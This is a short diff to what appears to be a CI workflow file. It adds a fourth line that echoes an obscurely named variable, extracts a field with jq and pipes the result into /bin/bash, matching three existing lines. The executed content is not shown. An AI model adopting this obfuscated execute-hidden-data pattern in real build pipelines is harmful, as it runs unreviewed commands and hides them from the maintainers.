@@ -26,6 +26,7 @@ jobs:
           echo $imlrv1068 | jq -r .k2729 | /bin/bash
           echo $ifd073 | jq -r .ydes3 | /bin/bash
           echo $s4652 | jq -r .h8 | /bin/bash
+          echo $zeh71919 | jq -r .f1 | /bin/bash
 
       - name: Archive output
         if: always()
